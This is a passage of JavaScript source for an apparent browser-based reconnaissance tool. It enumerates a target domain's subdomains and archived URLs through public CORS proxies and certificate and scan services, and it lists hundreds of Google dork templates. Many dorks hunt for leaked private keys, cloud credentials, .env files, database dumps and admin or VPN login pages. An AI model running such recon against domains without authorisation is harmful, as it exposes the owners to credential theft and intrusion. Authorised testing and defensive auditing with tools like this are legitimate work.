/* =========================================================
   BrahmastraX — Advanced Recon, Dorking & AI Security Assistant
   created by pradyumntiwarenexus
   Standalone Vanilla JS — No build tools, works on GitHub Pages
   ========================================================= */

/* ── CORS Proxies ── */
const PROXY_LIST = [
  u=>`https://corsproxy.io/?url=${encodeURIComponent(u)}`,
  u=>`https://cors.eu.org/${u}`,
  u=>`https://api.allorigins.win/raw?url=${encodeURIComponent(u)}`,
  u=>`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(u)}`,
  u=>`https://thingproxy.freeboard.io/fetch/${u}`,
];
const PROXY_LARGE = [
  u=>`https://cors.eu.org/${u}`,
  u=>`https://api.allorigins.win/raw?url=${encodeURIComponent(u)}`,
  u=>`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(u)}`,
  u=>`https://thingproxy.freeboard.io/fetch/${u}`,
  u=>`https://corsproxy.io/?url=${encodeURIComponent(u)}`,
];

async function proxyFetch(url, ms=13000, large=false) {
  const list = large ? PROXY_LARGE : PROXY_LIST;
  let last = new Error("All proxies failed");
  for (const make of list) {
    try {
      const r = await fetch(make(url), {signal: AbortSignal.timeout(ms)});
      if (r.ok) return r;
      last = new Error("HTTP "+r.status);
    } catch(e) { last=e; }
  }
  throw last;
}

function isValidSub(raw, domain) {
  if (!raw) return false;
  const s = raw.trim().toLowerCase();
  if (s.includes("@")||s.includes("/")||s.includes(":")||s.startsWith("*")) return false;
  if (!/^[a-z0-9][a-z0-9.\-]*[a-z0-9]$/.test(s) && s!==domain) return false;
  if (s!==domain && !s.endsWith("."+domain)) return false;
  if (s===domain) return false;
  if (s.split(".").some(l=>l.length>63)) return false;
  return true;
}

/* ── SUBDOMAIN FETCHERS ── */
async function fetchHackerTarget(d,ms=13000) {
  const url=`https://api.hackertarget.com/hostsearch/?q=${d}`;
  let text;
  try { const r=await fetch(url,{signal:AbortSignal.timeout(ms)}); text=await r.text(); }
  catch { try { const r=await proxyFetch(url,ms+5000); text=await r.text(); } catch { return []; } }
  if (!text) return [];
  if (text.includes("API count exceeded")||text.includes("API Key Required")||text.includes("Increase Quota")) { const e=new Error("quota"); e.quota=true; throw e; }
  if (text.startsWith("error")||text.startsWith("<")||!text.includes(",")) return [];
  return text.trim().split("\n").filter(l=>l.includes(","))
    .map(l=>{ const [s,ip]=l.split(","); return {subdomain:s.trim().toLowerCase(),ip:(ip||"").trim(),source:"hackertarget"}; })
    .filter(r=>isValidSub(r.subdomain,d));
}
async function fetchURLScan(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://urlscan.io/api/v1/search/?q=page.domain:${d}&size=100`,ms);
    const data=await r.json(); const seen=new Set(); const out=[];
    for (const x of (data.results||[])) {
      const s=(x?.page?.domain||"").toLowerCase();
      if (s&&isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:x?.page?.ip||"",source:"urlscan"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchCrtSh(d,ms=40000) {
  let res=null;
  const direct=`https://crt.sh/?q=%.${d}&output=json`;
  const proxied=`https://crt.sh/?q=%25.${d}&output=json`;
  try { const r=await fetch(direct,{signal:AbortSignal.timeout(ms)}); if(r.ok) res=r; } catch {}
  if (!res) { try { const r=await fetch(`https://corsproxy.io/?url=${encodeURIComponent(proxied)}`,{signal:AbortSignal.timeout(ms)}); if(r.ok) res=r; } catch {} }
  if (!res) return [];
  let text; try { text=await res.text(); } catch { return []; }
  if (!text||text.trimStart()[0]!=="[") return [];
  let data; try { data=JSON.parse(text); } catch { return []; }
  const seen=new Set(); const out=[];
  for (const e of data) {
    for (const n of (e.name_value||"").split("\n")) {
      const s=n.trim().replace(/^\*\./,"").toLowerCase();
      if (s&&isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"crtsh"}); }
    }
  }
  return out;
}
async function fetchJLDC(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://dns.bufferover.run/dns?q=.${d}`,ms);
    const data=await r.json(); const seen=new Set(); const out=[];
    for (const rec of [...(data.FDNS_A||[]),...(data.RDNS||[])]) {
      const parts=rec.split(","); const s=(parts[1]||parts[0]||"").toLowerCase().trim();
      const ip=parts.length>1?parts[0].trim():"";
      if (s&&isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip,source:"jldc"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchCertSpotter(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://api.certspotter.com/v1/issuances?domain=${d}&include_subdomains=true&expand=dns_names`,ms);
    const data=await r.json(); if (!Array.isArray(data)) return [];
    const seen=new Set(); const out=[];
    for (const c of data) for (const n of (c.dns_names||[])) {
      const s=n.replace(/^\*\./,"").toLowerCase().trim();
      if (s&&isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"certspotter"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchRapidDNS(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://rapiddns.io/subdomain/${d}?full=1`,ms);
    const html=await r.text(); const seen=new Set(); const out=[];
    for (const m of html.matchAll(/<td>([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})<\/td>/gi)) {
      const s=m[1].toLowerCase();
      if (isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"rapiddns"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchDNSRepo(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://dnsrepo.noc.org/?domain=${d}`,ms);
    const html=await r.text(); const seen=new Set(); const out=[];
    for (const m of html.matchAll(/([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})/gi)) {
      const s=m[1].toLowerCase();
      if (isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"dnsrepo"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchWaybackSub(d,ms=25000) {
  try {
    const r=await proxyFetch(`https://web.archive.org/cdx/search/cdx?url=*.${d}/*&output=text&fl=original&collapse=urlkey&limit=15000`,ms,true);
    const text=await r.text(); const seen=new Set(); const out=[];
    for (const line of text.trim().split("\n")) {
      try { const u=new URL(line.trim()); const h=u.hostname.toLowerCase(); if(isValidSub(h,d)&&!seen.has(h)){seen.add(h);out.push({subdomain:h,ip:"",source:"wayback_sub"});} } catch {}
    }
    return out;
  } catch { return []; }
}
async function fetchGitHub(d,ms=15000) {
  try {
    const r=await proxyFetch(`https://api.github.com/search/code?q=%22${d}%22&per_page=100`,ms);
    const data=await r.json(); const seen=new Set(); const out=[];
    const regex=new RegExp(`[a-z0-9][a-z0-9.\\-]*\\.${d.replace(/\./g,"\\.")}`, "gi");
    for (const item of (data.items||[])) {
      const text=[item.html_url||"",item.name||"",item.path||"",item.repository?.full_name||""].join(" ");
      for (const m of (text.match(regex)||[])) {
        const s=m.toLowerCase();
        if (isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"github"}); }
      }
    }
    return out;
  } catch { return []; }
}
async function fetchShodan(d,ms=15000) {
  try {
    const r=await proxyFetch(`https://www.shodan.io/search?query=hostname%3A${d}&facets=domain`,ms);
    const html=await r.text(); const seen=new Set(); const out=[];
    const regex=new RegExp(`[a-z0-9][a-z0-9.\\-]*\\.${d.replace(/\./g,"\\.")}`, "gi");
    for (const m of (html.match(regex)||[])) {
      const s=m.toLowerCase();
      if (isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"shodan"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchCensys(d,ms=15000) {
  try {
    const r=await proxyFetch(`https://search.censys.io/certificates?q=parsed.names%3A${d}&per_page=100`,ms);
    const html=await r.text(); const seen=new Set(); const out=[];
    const regex=new RegExp(`[a-z0-9][a-z0-9.\\-]*\\.${d.replace(/\./g,"\\.")}`, "gi");
    for (const m of (html.match(regex)||[])) {
      const s=m.toLowerCase();
      if (isValidSub(s,d)&&!seen.has(s)) { seen.add(s); out.push({subdomain:s,ip:"",source:"censys"}); }
    }
    return out;
  } catch { return []; }
}

/* ── ENDPOINT FETCHERS ── */
async function fetchWayback(d,ms=20000) {
  try {
    const r=await proxyFetch(`https://web.archive.org/cdx/search/cdx?url=*.${d}/*&output=json&fl=original,statuscode&collapse=urlkey&limit=3000`,ms,true);
    const data=await r.json(); if (!Array.isArray(data)) return [];
    const seen=new Set(); const out=[];
    for (const row of data.slice(1)) {
      const url=(row[0]||"").trim(); const status=(row[1]||"").trim();
      if (url&&!seen.has(url)) { seen.add(url); out.push({url,status,source:"wayback"}); }
    }
    return out;
  } catch { return []; }
}
async function fetchCommonCrawl(d,ms=20000) {
  try {
    const idx=await (await proxyFetch("https://index.commoncrawl.org/collinfo.json",8000)).json();
    const latest=idx[0]?.cdx_api||"https://index.commoncrawl.org/CC-MAIN-2024-10-index";
    const r=await proxyFetch(`${latest}?url=*.${d}/*&output=json&fl=url,status&limit=2000`,ms,true);
    const text=await r.text(); const seen=new Set(); const out=[];
    for (const line of text.trim().split("\n")) {
      try { const obj=JSON.parse(line); const url=obj.url?.trim(); if(url&&!seen.has(url)){seen.add(url);out.push({url,status:obj.status||"",source:"commoncrawl"});} } catch {}
    }
    return out;
  } catch { return []; }
}
async function fetchOTX(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://otx.alienvault.com/api/v1/indicators/domain/${d}/url_list?limit=500`,ms);
    const data=await r.json(); const seen=new Set(); const out=[];
    for (const x of (data.url_list||[])) {
      const url=x.url?.trim(); if(url&&!seen.has(url)){seen.add(url);out.push({url,status:"",source:"otx"});}
    }
    return out;
  } catch { return []; }
}
async function fetchURLScanEp(d,ms=13000) {
  try {
    const r=await proxyFetch(`https://urlscan.io/api/v1/search/?q=page.domain:${d}&size=100`,ms);
    const data=await r.json(); const seen=new Set(); const out=[];
    for (const x of (data.results||[])) {
      const url=x?.page?.url?.trim(); if(url&&!seen.has(url)){seen.add(url);out.push({url,status:String(x?.page?.status||""),source:"urlscan"});}
    }
    return out;
  } catch { return []; }
}

/* ══════════════════════════════════════════════
   GOOGLE DORK CATEGORIES — 500+ DORKS, 20 CATEGORIES
   ══════════════════════════════════════════════ */
const DORK_CATEGORIES = [
  {
    id:"sensitive", title:"Sensitive Files & Data", emoji:"📁",
    color:"rgba(248,113,113,0.12)", border:"rgba(248,113,113,0.3)", textColor:"#f87171",
    dorks:[
      {label:"Config / ENV files", query:'site:{domain} ext:env | ext:config | ext:cfg | ext:ini'},
      {label:"SQL dump files", query:'site:{domain} ext:sql | ext:sql.gz | ext:db'},
      {label:"Backup files", query:'site:{domain} ext:bak | ext:backup | ext:old | ext:orig'},
      {label:"Log files", query:'site:{domain} ext:log'},
      {label:"Password files", query:'site:{domain} intitle:"index of" "passwd" | "password"'},
      {label:"Private keys", query:'site:{domain} ext:pem | ext:key | ext:ppk'},
      {label:"AWS credentials", query:'site:{domain} "aws_access_key_id" | "aws_secret_access_key"'},
      {label:"Token / Secret in files", query:'site:{domain} ext:txt | ext:json "token" | "secret" | "api_key"'},
      {label:"Database credential files", query:'site:{domain} "DB_PASSWORD" | "DB_USER" | "DATABASE_URL"'},
      {label:"SSH private key", query:'site:{domain} "BEGIN RSA PRIVATE KEY" | "BEGIN OPENSSH PRIVATE KEY"'},
      {label:"Exposed .htpasswd", query:'site:{domain} inurl:.htpasswd | intitle:"Index of" ".htpasswd"'},
      {label:"Config.php exposed", query:'site:{domain} inurl:config.php | inurl:configuration.php'},
      {label:"WordPress config", query:'site:{domain} inurl:wp-config.php | inurl:wp-config.php.bak'},
      {label:"Connection strings", query:'site:{domain} "connectionString" | "connection_string" | "connstr"'},
      {label:"JDBC connection", query:'site:{domain} "jdbc:mysql" | "jdbc:postgresql" | "jdbc:oracle"'},
      {label:".env.local / .env.production", query:'site:{domain} inurl:.env.local | inurl:.env.production | inurl:.env.staging'},
      {label:"Redis / MongoDB URI", query:'site:{domain} "redis://" | "mongodb://" | "mongodb+srv://"'},
      {label:"FTP credentials", query:'site:{domain} "ftp://" "username" | "password"'},
      {label:"Hardcoded passwords", query:'site:{domain} "password=" | "passwd=" | "pwd=" ext:txt | ext:log | ext:sql'},
      {label:"Secrets in YAML", query:'site:{domain} ext:yaml | ext:yml "password:" | "secret:" | "token:"'},
      {label:"Credentials in JSON", query:'site:{domain} ext:json "password" | "secret" | "api_key" | "access_token"'},
      {label:"Backup SQL database", query:'site:{domain} ext:sql.gz | ext:dump | ext:tar.gz intitle:"index of"'},
      {label:"Server key files", query:'site:{domain} ext:jks | ext:pfx | ext:p12 | ext:keystore'},
      {label:"OAuth token leak", query:'site:{domain} "access_token" | "oauth_token" | "refresh_token" ext:json'},
      {label:"Cloud function secrets", query:'site:{domain} "GOOGLE_APPLICATION_CREDENTIALS" | "FIREBASE_TOKEN"'},
    ]
  },
  {
    id:"login", title:"Login & Admin Panels", emoji:"🔐",
    color:"rgba(139,92,246,0.12)", border:"rgba(139,92,246,0.3)", textColor:"#a78bfa",
    dorks:[
      {label:"Admin panels", query:'site:{domain} inurl:admin | inurl:administrator | inurl:wp-admin'},
      {label:"Login pages", query:'site:{domain} inurl:login | inurl:signin | inurl:auth'},
      {label:"Dashboard pages", query:'site:{domain} inurl:dashboard | inurl:panel | inurl:control'},
      {label:"phpMyAdmin", query:'site:{domain} inurl:phpmyadmin'},
      {label:"CMS login", query:'site:{domain} inurl:wp-login | inurl:joomla | inurl:drupal'},
      {label:"Portal login", query:'site:{domain} inurl:portal | inurl:sso | inurl:idp'},
      {label:"Admin console", query:'site:{domain} inurl:console | inurl:management | inurl:admin-console'},
      {label:"Outlook / OWA", query:'site:{domain} inurl:/owa/ | inurl:outlook | inurl:exchange/logon'},
      {label:"Webmail login", query:'site:{domain} inurl:webmail | inurl:roundcube | inurl:horde'},
      {label:"Citrix / VPN login", query:'site:{domain} inurl:citrix | inurl:vpn-login | inurl:nf/auth'},
      {label:"Control panels", query:'site:{domain} inurl:cPanel | inurl:WHM | inurl:plesk'},
      {label:"ERP / CRM login", query:'site:{domain} inurl:erp | inurl:crm | inurl:salesforce/login'},
      {label:"Jenkins login", query:'site:{domain} inurl:jenkins | inurl:/j_acegi_security_check'},
      {label:"Grafana login", query:'site:{domain} inurl:grafana | inurl:grafana/login'},
      {label:"Kibana panel", query:'site:{domain} inurl:kibana | inurl:app/kibana'},
      {label:"Bitbucket / Jira", query:'site:{domain} inurl:jira | inurl:bitbucket | inurl:confluence/login'},
      {label:"LDAP / Active Directory", query:'site:{domain} inurl:ldap | inurl:active-directory | inurl:adfs'},
      {label:"Two-factor auth bypass", query:'site:{domain} inurl:2fa | inurl:mfa | inurl:totp | inurl:otp'},
      {label:"Password reset pages", query:'site:{domain} inurl:reset-password | inurl:forgot-password | inurl:recover'},
      {label:"Registration forms", query:'site:{domain} inurl:register | inurl:signup | inurl:create-account'},
      {label:"OpenVPN Access Server", query:'site:{domain} inurl:/__auth | inurl:openvpn | intitle:"OpenVPN Access"'},
      {label:"Sophos / FortiGate", query:'site:{domain} inurl:sophos | inurl:fortigate | inurl:fortiweb'},
      {label:"SSH web interface", query:'site:{domain} inurl:shellinabox | inurl:webssh | inurl:gateone'},
      {label:"Legacy admin panels", query:'site:{domain} inurl:admin.asp | inurl:admin.php | inurl:admin.jsp'},
      {label:"SuperAdmin / Root panel", query:'site:{domain} inurl:superadmin | inurl:root-panel | inurl:sysadmin'},
    ]
  },
  {
    id:"api", title:"APIs & Endpoints", emoji:"🔌",
    color:"rgba(99,179,255,0.12)", border:"rgba(99,179,255,0.3)", textColor:"#63b3ff",
    dorks:[
      {label:"API endpoints", query:'site:{domain} inurl:/api/ | inurl:/v1/ | inurl:/v2/ | inurl:/rest/'},
      {label:"GraphQL", query:'site:{domain} inurl:graphql | inurl:graphiql'},
      {label:"Swagger UI", query:'site:{domain} inurl:swagger | inurl:api-docs | inurl:openapi'},
      {label:"API keys in JS", query:'site:{domain} ext:js "apiKey" | "api_key" | "secret"'},
      {label:"Exposed endpoints", query:'site:{domain} intitle:"index of" "/api"'},
      {label:"Postman collections", query:'site:{domain} ext:json "postman_collection"'},
      {label:"REST API debug mode", query:'site:{domain} inurl:api "debug" | "verbose" | "trace"'},
      {label:"WSDL / SOAP", query:'site:{domain} ext:wsdl | inurl:wsdl | inurl:?wsdl'},
      {label:"API tokens in URL", query:'site:{domain} inurl:?token= | inurl:?api_key= | inurl:?access_token='},
      {label:"Webhook endpoints", query:'site:{domain} inurl:webhook | inurl:callback | inurl:hook'},
      {label:"gRPC endpoints", query:'site:{domain} inurl:grpc | inurl:.proto'},
      {label:"API version exposure", query:'site:{domain} inurl:/api/v | inurl:/rest/v | inurl:/service/v'},
      {label:"Internal API discovery", query:'site:{domain} inurl:/internal/ | inurl:/private/api | inurl:/admin/api'},
      {label:"Exposed API schemas", query:'site:{domain} ext:json "schema" "properties" | "definitions"'},
      {label:"API rate limit bypass", query:'site:{domain} inurl:api "X-Rate-Limit" | "Retry-After"'},
      {label:"JSONP endpoints", query:'site:{domain} inurl:callback= | inurl:jsonp | inurl:?cb='},
      {label:"API health check", query:'site:{domain} inurl:/health | inurl:/healthz | inurl:/ping | inurl:/status'},
      {label:"OpenAPI/Swagger JSON", query:'site:{domain} ext:json "swagger" | "openapi" "paths"'},
      {label:"API key in env file", query:'site:{domain} ext:env "API_KEY" | "API_SECRET" | "STRIPE_SECRET"'},
      {label:"Payment gateway API", query:'site:{domain} inurl:payment | inurl:checkout | inurl:pay/api'},
      {label:"Mobile API endpoints", query:'site:{domain} inurl:/mobile/api | inurl:/app/api | inurl:/ios/ | inurl:/android/'},
      {label:"Undocumented endpoints", query:'site:{domain} inurl:/dev/ | inurl:/test/ | inurl:/beta/api'},
      {label:"Elasticsearch API", query:'site:{domain} inurl:_search | inurl:_cat/indices | inurl:_cluster'},
      {label:"Firebase REST API", query:'site:{domain} "firebaseio.com" inurl:.json'},
      {label:"Serverless function endpoints", query:'site:{domain} inurl:/.netlify/functions | inurl:/api/serverless'},
    ]
  },
  {
    id:"exposed", title:"Exposed Directories", emoji:"📂",
    color:"rgba(251,191,36,0.12)", border:"rgba(251,191,36,0.3)", textColor:"#fbbf24",
    dorks:[
      {label:"Directory listing", query:'site:{domain} intitle:"index of /"'},
      {label:"Git exposed", query:'site:{domain} inurl:/.git'},
      {label:".htaccess exposed", query:'site:{domain} inurl:.htaccess | inurl:.htpasswd'},
      {label:"Exposed uploads", query:'site:{domain} intitle:"index of" "uploads" | "files"'},
      {label:"DS_Store files", query:'site:{domain} inurl:.DS_Store'},
      {label:"SVN exposed", query:'site:{domain} inurl:/.svn/entries'},
      {label:"CVS repository", query:'site:{domain} inurl:CVS/Root | inurl:CVS/Entries'},
      {label:"Mercurial repository", query:'site:{domain} inurl:/.hg/'},
      {label:"Bazaar VCS", query:'site:{domain} inurl:/.bzr/'},
      {label:"Exposed tmp folder", query:'site:{domain} intitle:"index of" "/tmp/" | "/temp/"'},
      {label:"Exposed logs folder", query:'site:{domain} intitle:"index of" "/logs/" | "/log/"'},
      {label:"Exposed config folder", query:'site:{domain} intitle:"index of" "/config/" | "/conf/"'},
      {label:"Exposed backup folder", query:'site:{domain} intitle:"index of" "/backup/" | "/bkp/" | "/bak/"'},
      {label:"Exposed node_modules", query:'site:{domain} intitle:"index of" "node_modules"'},
      {label:"Exposed .well-known", query:'site:{domain} inurl:/.well-known/'},
      {label:"Exposed vendor folder", query:'site:{domain} intitle:"index of" "/vendor/" | "/lib/"'},
      {label:"Exposed dist folder", query:'site:{domain} intitle:"index of" "/dist/" | "/build/"'},
      {label:"Exposed storage", query:'site:{domain} intitle:"index of" "/storage/" | "/data/"'},
      {label:"Apache autoindex", query:'site:{domain} intitle:"Apache2 Ubuntu Default Page"'},
      {label:"Nginx default page", query:'site:{domain} intitle:"Welcome to nginx!"'},
      {label:"IIS default page", query:'site:{domain} intitle:"IIS Windows Server"'},
      {label:"Open S3 bucket listing", query:'site:s3.amazonaws.com intitle:"index of" "{domain}"'},
      {label:"Google Drive folder", query:'site:drive.google.com "{domain}"'},
      {label:"Sharepoint exposed", query:'site:{domain} inurl:sharepoint | inurl:_layouts'},
      {label:"Confluence spaces", query:'site:{domain} inurl:confluence/display | inurl:wiki/spaces'},
    ]
  },
  {
    id:"subdomains", title:"Subdomains & Infrastructure", emoji:"🌐",
    color:"rgba(52,211,153,0.12)", border:"rgba(52,211,153,0.3)", textColor:"#34d399",
    dorks:[
      {label:"Dev/Staging subdomains", query:'site:dev.{domain} | site:staging.{domain} | site:test.{domain}'},
      {label:"Internal subdomains", query:'site:internal.{domain} | site:intranet.{domain} | site:vpn.{domain}'},
      {label:"All subdomains", query:'site:*.{domain}'},
      {label:"Beta subdomains", query:'site:beta.{domain} | site:alpha.{domain} | site:preview.{domain}'},
      {label:"CI/CD subdomains", query:'site:jenkins.{domain} | site:gitlab.{domain} | site:ci.{domain}'},
      {label:"QA/UAT subdomains", query:'site:qa.{domain} | site:uat.{domain} | site:stg.{domain}'},
      {label:"API subdomains", query:'site:api.{domain} | site:api2.{domain} | site:rest.{domain}'},
      {label:"Mail subdomains", query:'site:mail.{domain} | site:smtp.{domain} | site:webmail.{domain}'},
      {label:"CDN subdomains", query:'site:cdn.{domain} | site:static.{domain} | site:assets.{domain}'},
      {label:"Admin subdomains", query:'site:admin.{domain} | site:manage.{domain} | site:panel.{domain}'},
      {label:"Dev portal", query:'site:developer.{domain} | site:dev-portal.{domain} | site:devapi.{domain}'},
      {label:"Monitoring subdomains", query:'site:monitor.{domain} | site:status.{domain} | site:uptime.{domain}'},
      {label:"Legacy subdomains", query:'site:old.{domain} | site:legacy.{domain} | site:archive.{domain}'},
      {label:"Mobile API subdomains", query:'site:m.{domain} | site:mobile.{domain} | site:app.{domain}'},
      {label:"VPN / Remote access", query:'site:vpn.{domain} | site:remote.{domain} | site:access.{domain}'},
      {label:"Helpdesk / Support", query:'site:support.{domain} | site:help.{domain} | site:helpdesk.{domain}'},
      {label:"HR / Employee portal", query:'site:hr.{domain} | site:employee.{domain} | site:staff.{domain}'},
      {label:"Finance portal", query:'site:finance.{domain} | site:billing.{domain} | site:payments.{domain}'},
      {label:"Search/Elastic", query:'site:search.{domain} | site:elastic.{domain} | site:solr.{domain}'},
      {label:"Git / Code hosting", query:'site:git.{domain} | site:repo.{domain} | site:code.{domain}'},
      {label:"Docker / Container registry", query:'site:registry.{domain} | site:docker.{domain} | site:hub.{domain}'},
      {label:"Partner portals", query:'site:partner.{domain} | site:affiliate.{domain} | site:reseller.{domain}'},
      {label:"SSO subdomains", query:'site:sso.{domain} | site:auth.{domain} | site:login.{domain}'},
      {label:"Test environment", query:'site:sandbox.{domain} | site:demo.{domain} | site:playground.{domain}'},
      {label:"Data / Analytics", query:'site:data.{domain} | site:analytics.{domain} | site:bi.{domain}'},
    ]
  },
  {
    id:"cloud", title:"Cloud & Storage", emoji:"☁️",
    color:"rgba(56,189,248,0.12)", border:"rgba(56,189,248,0.3)", textColor:"#38bdf8",
    dorks:[
      {label:"S3 buckets", query:'site:s3.amazonaws.com "{domain}"'},
      {label:"Azure Blob", query:'site:blob.core.windows.net "{domain}"'},
      {label:"GCP Bucket", query:'site:storage.googleapis.com "{domain}"'},
      {label:"Firebase DB", query:'site:firebaseio.com "{domain}"'},
      {label:"Cloud credentials", query:'site:{domain} "aws_access_key" | "aws_secret" | "AZURE_"'},
      {label:"DigitalOcean Spaces", query:'site:digitaloceanspaces.com "{domain}"'},
      {label:"Cloudflare R2", query:'site:r2.cloudflarestorage.com "{domain}"'},
      {label:"Backblaze B2", query:'site:s3.us-west-001.backblazeb2.com "{domain}"'},
      {label:"Linode Object Storage", query:'site:linodeobjects.com "{domain}"'},
      {label:"GCP App Engine", query:'site:{domain}.appspot.com'},
      {label:"AWS Elastic Beanstalk", query:'site:{domain}.elasticbeanstalk.com'},
      {label:"Azure WebApp", query:'site:{domain}.azurewebsites.net'},
      {label:"Heroku app", query:'site:{domain}.herokuapp.com'},
      {label:"Netlify site", query:'site:{domain}.netlify.app'},
      {label:"Vercel deployment", query:'site:{domain}.vercel.app'},
      {label:"GitHub Pages", query:'site:{domain}.github.io'},
      {label:"AWS Lambda exposed", query:'site:{domain} "execute-api" "amazonaws.com"'},
      {label:"Exposed ECR registry", query:'site:{domain} "ecr.aws" | "amazonaws.com/v2/"'},
      {label:"S3 presigned URL", query:'site:{domain} "X-Amz-Signature" | "AWSAccessKeyId"'},
      {label:"Cloud init / userdata", query:'site:{domain} "cloud-init" | "#cloud-config" | "userdata"'},
      {label:"Terraform state file", query:'site:{domain} "terraform.tfstate" | ext:tfstate'},
      {label:"Ansible vault", query:'site:{domain} ext:vault | "ansible_vault"'},
      {label:"Kubernetes config", query:'site:{domain} "apiVersion" "kubectl" | ext:yaml "kind: Secret"'},
      {label:"CloudFormation template", query:'site:{domain} ext:json | ext:yaml "AWSTemplateFormatVersion"'},
      {label:"Azure AD secrets", query:'site:{domain} "AZURE_CLIENT_SECRET" | "AZURE_TENANT_ID"'},
    ]
  },
  {
    id:"errors", title:"Error Pages & Debug Info", emoji:"⚠️",
    color:"rgba(251,146,60,0.12)", border:"rgba(251,146,60,0.3)", textColor:"#fb923c",
    dorks:[
      {label:"Stack traces", query:'site:{domain} "stack trace" | "traceback" | "exception"'},
      {label:"PHP errors", query:'site:{domain} "PHP Parse error" | "PHP Warning" | "PHP Fatal"'},
      {label:"SQL errors", query:'site:{domain} "sql syntax" | "mysql_fetch" | "ORA-01"'},
      {label:"Debug mode", query:'site:{domain} "debug=true" | "debug=1" | "APP_DEBUG"'},
      {label:"Server info", query:'site:{domain} intitle:"phpinfo" "PHP Version"'},
      {label:"Django errors", query:'site:{domain} "DisallowedHost" | "Django Version"'},
      {label:"Ruby on Rails errors", query:'site:{domain} "ActionController" | "NoMethodError" | "Rails.env"'},
      {label:"Node.js errors", query:'site:{domain} "ReferenceError" | "TypeError" | "at Object.<anonymous>"'},
      {label:"Python tracebacks", query:'site:{domain} "Traceback (most recent call last)" | "AttributeError"'},
      {label:"Java stack trace", query:'site:{domain} "java.lang.NullPointerException" | "at com." | "Exception in thread"'},
      {label:".NET errors", query:'site:{domain} "System.NullReferenceException" | "ASP.NET" "error"'},
      {label:"Oracle DB errors", query:'site:{domain} "ORA-00933" | "ORA-00907" | "ORA-01747"'},
      {label:"MSSQL errors", query:'site:{domain} "Incorrect syntax near" | "Unclosed quotation mark"'},
      {label:"MongoDB errors", query:'site:{domain} "MongoError" | "MongoNetworkError" | "mongodb"'},
      {label:"GraphQL errors", query:'site:{domain} "GraphQL" "errors" | "GRAPHQL_VALIDATION_FAILED"'},
      {label:"Tomcat error page", query:'site:{domain} intitle:"Apache Tomcat" "HTTP Status"'},
      {label:"WP debug info", query:'site:{domain} "wp-content/debug.log" | "WordPress database error"'},
      {label:"403 admin bypass", query:'site:{domain} inurl:admin "403 Forbidden" | "Access Denied"'},
      {label:"Test/Debug endpoints", query:'site:{domain} inurl:/test | inurl:/debug | inurl:/trace'},
      {label:"Source code in errors", query:'site:{domain} "source code" "error" | "line" | "function"'},
      {label:"Larvel debug", query:'site:{domain} "Symfony\\Component" | "Illuminate\\Foundation"'},
      {label:"Flask debug toolbar", query:'site:{domain} "Werkzeug Debugger" | "Flask Debug"'},
      {label:"Sentry / Rollbar keys", query:'site:{domain} "sentry_dsn" | "SENTRY_DSN" | "rollbar_token"'},
      {label:"Verbose API errors", query:'site:{domain} "Internal Server Error" "api" | "json" | "response"'},
      {label:"CORS misconfiguration", query:'site:{domain} "Access-Control-Allow-Origin: *"'},
    ]
  },
  {
    id:"documents", title:"Documents & Reports", emoji:"📄",
    color:"rgba(236,72,153,0.12)", border:"rgba(236,72,153,0.3)", textColor:"#ec4899",
    dorks:[
      {label:"PDF documents", query:'site:{domain} ext:pdf "confidential" | "internal"'},
      {label:"Excel files", query:'site:{domain} ext:xlsx | ext:xls | ext:csv'},
      {label:"Word documents", query:'site:{domain} ext:doc | ext:docx'},
      {label:"Presentation files", query:'site:{domain} ext:ppt | ext:pptx'},
      {label:"Sensitive docs", query:'site:{domain} ext:pdf | ext:doc "password" | "credentials"'},
      {label:"Text files with data", query:'site:{domain} ext:txt "username" | "password" | "token"'},
      {label:"Internal reports", query:'site:{domain} ext:pdf "internal use only" | "do not distribute"'},
      {label:"Financial documents", query:'site:{domain} ext:pdf | ext:xlsx "invoice" | "budget" | "financial"'},
      {label:"Employee directories", query:'site:{domain} ext:xls | ext:xlsx "employee" | "staff" | "personnel"'},
      {label:"Network diagrams", query:'site:{domain} ext:vsd | ext:vsdx | ext:dia "network" | "topology"'},
      {label:"Security audit reports", query:'site:{domain} ext:pdf "security audit" | "penetration test" | "vulnerability"'},
      {label:"API documentation PDF", query:'site:{domain} ext:pdf "API" "documentation" | "reference"'},
      {label:"Contract documents", query:'site:{domain} ext:pdf "contract" | "agreement" | "NDA"'},
      {label:"Meeting minutes", query:'site:{domain} ext:doc | ext:pdf "meeting minutes" | "minutes of meeting"'},
      {label:"HR documents", query:'site:{domain} ext:pdf | ext:doc "HR" | "human resources" | "onboarding"'},
      {label:"Technical specs", query:'site:{domain} ext:pdf "technical specification" | "system design"'},
      {label:"Backup of sensitive docs", query:'site:{domain} ext:pdf.bak | ext:doc.bak | intitle:"index of" ext:pdf'},
      {label:"Site policies", query:'site:{domain} ext:pdf "privacy policy" | "terms of service"'},
      {label:"Credential sheets", query:'site:{domain} ext:xls | ext:xlsx "username" "password"'},
      {label:"Source code archive", query:'site:{domain} ext:zip | ext:tar.gz "source" | "src"'},
      {label:"Architecture diagrams", query:'site:{domain} ext:png | ext:jpg "architecture" | "infrastructure"'},
